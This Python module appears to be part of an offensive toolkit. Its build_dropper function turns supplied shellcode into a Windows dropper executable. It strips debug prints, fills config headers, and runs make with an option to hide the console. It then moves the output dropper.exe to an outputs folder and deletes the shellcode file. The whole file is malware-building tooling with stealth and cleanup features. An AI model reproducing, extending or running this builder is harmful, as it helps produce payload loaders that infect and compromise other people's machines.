import os
import subprocess
import shutil

from datetime import datetime
from .compilation_setup import *
from .files_handling import *


def build_dropper(dropper_config: dict, temp_dir: str = None):
    """Builds a dropper by copying project files, generating shellcode, replacing placeholders, and running Makefile."""
    print('Compiling Dropper...')

    # Extract known parameters with default values
    out_filename = dropper_config.get("out_filename")
    shellcode_path = dropper_config.get("shellcode_path")

    # Step 1: Copy the project to a temporary directory
    if not temp_dir:
        temp_dir = copy_project_to_temp()
    
    # Step 2: Clean up the temporary project
    if not dropper_config.get("debug", False):
        remove_debug_code("DebugPrint", temp_dir)
        remove_debug_code("DebugPrintW", temp_dir)

    # Step 2: Fill config headers with preprocessing macros and constants
    #print(f"Shellcode pre-processing flags: {", ".join(dropper_config.get("preprocessing_macros"))}")
    fill_config_header(dropper_config, temp_dir)

    # Step 3: Construct the Make command
    set_makefile_source_files(temp_dir)
    hide_console = dropper_config.get('hide_console', None)
    command = ["make", "-f", "./Makefile", "-j10"] + [
        f"OUTPUT_FILE={out_filename}",
        f"HIDE_CONSOLE={"true" if hide_console else "false"}",
    ]

    #print("Running command:", " ".join(command))  # Debugging output

    # Step 4: Run the make command with error handling
    try:
        subprocess.run(command, check=True, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        #print("Compilation done successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e}")
        print(f"#### Error Details ####")
        print(f"### Command:\n{command}\n")
        print(f"### stdout:\n{e.stdout}\n")
        print(f"### stderr:\n{e.stderr}\n")

    # Step 5: Move the output file to the specified output directory
    src = os.path.join(temp_dir, "bin", "dropper.exe")
    dst_dir = "./dropper_outputs/"
    dst = os.path.join(dst_dir, out_filename)

    if os.path.exists(dst):
        base, ext = os.path.splitext(out_filename)
        new_filename = f"{base}_{datetime.now().strftime('%d_%m_%Y-%H_%M_%S')}{ext}"
        dst = os.path.join(dst_dir, new_filename)

    try:
        print(src, dst)
        shutil.move(src, dst)
        #print("Output file moved successfully.")
    except Exception as e:
        print(f"Failed to move output file: {e}")

    # Step 6: Clean up the temporary directory
    if shellcode_path:
        delete_file_or_directory(shellcode_path)
    #delete_file_or_directory(temp_dir)